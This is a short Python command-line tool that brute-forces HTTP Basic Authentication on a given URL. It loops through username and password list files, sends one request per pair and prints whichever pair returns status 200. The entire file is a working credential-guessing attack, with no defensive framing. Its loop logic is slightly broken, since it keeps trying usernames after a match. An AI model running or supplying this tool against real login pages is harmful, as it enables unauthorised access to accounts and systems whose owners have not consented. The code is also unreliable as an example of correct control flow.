'''

*** SAJAD ALIBABAIE ***

'''

import requests, argparse, base64, sys

argumans = argparse.ArgumentParser()
argumans.add_argument("-u", help="username list file path")
argumans.add_argument("-p", help="password list file path")
argumans.add_argument("-url", help="url for basic authentication fuzzing")
args = argumans.parse_args()


def main():
    if args.u is None:
        print("ERROR : enter USERNAME list path with -u switch")
        exit()
    if args.p is None:
        print("ERROR : enter PASSWORD list path with -p switch")
        exit()
    if args.u is None or args.p is None or args.url is None:
        print("ERROR : enter web URL with -url switch")
        exit()
    usernames = []
    passwords = []
    find = False
    user_file = open(f"{args.u}", "r")
    pass_file = open(f"{args.p}", "r")
    for user in user_file:
        usernames.append(user.rstrip())
    for password in pass_file:
        passwords.append(password.rstrip())

    total = usernames.__len__() * passwords.__len__()
    print("\n****************************************")
    print(F"     START TO BRUTE FORCE {total} ITEMS")
    print("****************************************\n")
    prog = 0
    for userName in usernames:
        for password in passwords:
            progress(prog, total, " Brute-Forcing")
            prog += 1
            base64_auth = (base64.b64encode(f"{userName}:{password}".encode("ascii"))).decode("ascii")
            req_header = {"Authorization": f"Basic {base64_auth}"}
            req = requests.get(args.url, headers=req_header)
            if req.status_code == 200:
                progress(total, total)
                find = True
                print(f"\n\nCorrect UserName is : {userName}")
                print(f"Correct Password is : {password}")
                break
            if find:
                break

    if find is False:
        print("\n\n**NO UserName OR Password Matched**")


def progress(count, total, status=''):
    bar_len = 60
    filled_len = int(round(bar_len * count / float(total)))

    percents = round(100.0 * count / float(total), 1)
    bar = '|' * filled_len + '.' * (bar_len - filled_len)

    sys.stdout.write('[%s] %s%s ...%s\r' % (bar, percents, '%', status))
    sys.stdout.flush()


if __name__ == '__main__':
    main()
